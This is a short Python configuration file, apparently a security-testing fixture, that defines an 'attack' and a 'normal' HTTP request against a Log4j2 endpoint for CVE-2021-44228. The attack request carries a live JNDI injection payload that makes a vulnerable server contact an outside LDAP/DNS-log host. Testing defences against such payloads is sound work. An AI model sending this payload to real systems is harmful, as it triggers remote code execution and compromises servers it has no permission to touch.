# Auto-generated from index/vul.py split by module.
import os

host = os.environ.get('HOST', '192.168.0.9')

requests_config = {'log4j2_attack': {'name': 'Log4j2 远程代码执行漏洞（CVE-2021-44228）',
                   'method': 'POST',
                   'url': 'http://{}:9998/log4j2'.format(host),
                   'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                   'data': 'name=${jndi:ldap://sectest-log4j2.dnslog.cn/a}',
                   'type': 'attack'},
 'log4j2_normal': {'method': 'POST',
                   'url': 'http://{}:9998/log4j2'.format(host),
                   'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                   'data': 'name=1',
                   'name': 'Log4j2 远程代码执行漏洞（CVE-2021-44228）',
                   'type': 'normal'}}
